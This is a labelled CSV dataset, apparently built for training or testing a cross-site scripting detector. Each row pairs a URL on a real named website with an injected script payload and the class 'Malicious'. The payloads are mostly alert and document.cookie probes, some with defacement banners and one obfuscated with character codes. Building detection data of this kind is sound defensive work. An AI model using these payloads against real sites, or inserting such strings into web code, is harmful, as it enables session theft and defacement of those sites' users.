Payloads,Class
http://www.bog.gov.gh/index1.php?linkid=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.dallas.bbb.org/wwwroot/search.aspx?site=50&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie<br>%29%3c/script%3e,Malicious
http://store.blackberryitalia.it/platformmain.asp?platform=5&amp;sstring_39616.5745486111=%22%3e%3cscrip<br>t%3ealert%28%22fugitif%22%29%3c%2fscript%3e&amp;sstring=%22%3e%3cscript%3ealert%28%22fugitif%22%29%3c%2f<br>script%3e&amp;cmdsearch.x=9&amp;cmdsearch.y=12,Malicious
http://www.stuttgart.de/sde/search.php?action=search&amp;search=%22%3e%3cscript%3ealert%28%22totalschade<br>n%22%29%3c%2fscript%3e&amp;x=15&amp;y=11,Malicious
http://www.shambhala.com/html/catalog/items/isbn/1-59030-098-x.cfm?selectedtext=&quot;&gt;&lt;script&gt;alert(&quot;max<br>wel&quot;)&lt;/script&gt;,Malicious
http://www.radyovenus.com/haber/haber_detay.php?haber_id=tfound=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious
http://www.templatehelp.com/pr_interface.php?bgcolor=%23ffffff&amp;cols=4&amp;rows=4&amp;sp=5&amp;sadult=0&amp;pr_code=i<br>y9p88mxzw4gs37njlersf01e23p6c&amp;category=0&amp;keyword=%22%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e&amp;extref=http%253a%2f%2fsearch.freefind.com%2ffind.html%253fid%253d27600877%2526pageid%253dr%<br>2526mode%253dall%2526n%253d0%2526_charset_%253dutf-8%2526bcd%253d%2525c3%2525b7%2526query%253d%25252<br>2%25253cscript%25253ealert%252528document.cookie%252529%25253b%25253c%25252fscript%25253e%2526x%253d<br>11%2526y%253d10&amp;extref=http%253a%2f%2fsearch.freefind.com%2ffind.html%253fid%253d27600877%2526pageid<br>%253dr%2526mode%253dall%2526n%253d0%2526_charset_%253dutf-8%2526bcd%253d%2525c3%2525b7%2526query%253<br>d%252522%25253cscript%25253ealert%252528document.cookie%252529%25253b%25253c%25252fscript%25253e%252<br>6x%253d11%2526y%253d10,Malicious
http://www.lifewithsherry.com/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gsmtrack.nl/index.php?page=navi_merken&amp;action=navigatie&amp;id=%27%22%3e%3c/title%3e%3cscript<br>%3ealert%281337%29%3c/script%3e,Malicious
http://www.andrewbrooksphotography.com/image.php?id=647%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e,Malicious
http://srco.ir//articles/printpage.asp?ref=/articles/alist/rfidsystem-1.htm&amp;title=securitylab%3c%2ft<br>itle%3e1%22/%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/script%3e,Malicious
http://search.greatfallstribune.com/sp?aff=209&amp;keywords=%22%3e%27%3e%3cscript%3ealert(123)%3c/script<br>%3e&amp;submit=go,Malicious
http://www.farsnews.com/english/rslt.php?txt=%3cscript%3ealert%28%22zion+kicks+iran%22%29%3b%3c%2fsc<br>ript%3e&amp;asdate=&amp;todate=&amp;aor=sh&amp;area%5b%5d=title&amp;nr=14&amp;srv%5b%5d=0,Malicious
http://www.wwf.org.my/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;x=0&amp;y=<br>0,Malicious
http://www2.miempresa.gob.pe/compras_estatales/detalle_convocatoria_his.php?c=08/0187028_0002_03}%3c<br>/style%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%2<br>0xylitol%3c/h1%3e%3c/marquee%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
http://www.retroworks.es/php/game.php?id=9%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.sagliksen.org/articles.php?category_id=66&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.csastro.org/forums/cal_lite.php?id=12&amp;mode=display&amp;cl_d=%3cscript%3ealert(document.cookie<br>)%3c/script%3e&amp;cl_m=11&amp;cl_y=2008,Malicious
http://www.curezone.com/faq/c.asp?a=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious
http://www.swiss.org.au/members.php?id=1&amp;searchtext=%22%3e%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e&amp;submit=go,Malicious
http://www.jfkl.org.my/search.php?words=&lt;script&gt;a=eval;b=alert;a(b(/alert!!!!/.source));&lt;/script&gt;'&quot;&gt;<br>&lt;marquee&gt;bug xss detected&lt;/h1&gt;&lt;/marquee&gt;&lt;script&gt;a=eval;b=alert;a(b(/bug xss detected by<br>vir0e5/.source));&lt;/script&gt;,Malicious
http://www.rfod.se/folklink/index.asp?lang=en&amp;cat='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e<br>%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://orz.b2ch.net/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealert<br>(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.santoandre.sp.gov.br/bn_busca_site.asp?texto=%3cscript%3ealert%28%27xssed%27%29%3c%2fscri<br>pt%3e&amp;i4.x=0&amp;i4.y=0&amp;tipo_palavra=1,Malicious
http://www.gouv.mc/devwww/wwwnew.nsf/1909!/x6gb?opendocument&amp;%22%3e%3cscript%3ealert(123)%3c/script%<br>3e,Malicious
http://www.anaivanovic.com/?path=tell_a_friend&amp;detailpage=1262&amp;lang=en&amp;link=&quot;&gt;&lt;script&gt;alert('pappy<br>says your hot!');&lt;/script&gt;,Malicious
http://www.das-reiki-portal.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gametrailers.com/previews.php?plattyfilt=&amp;letter=y&amp;order_by=date+desc%22%3e%27%3e%3c%73%6<br>3%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36<br>%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%<br>31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
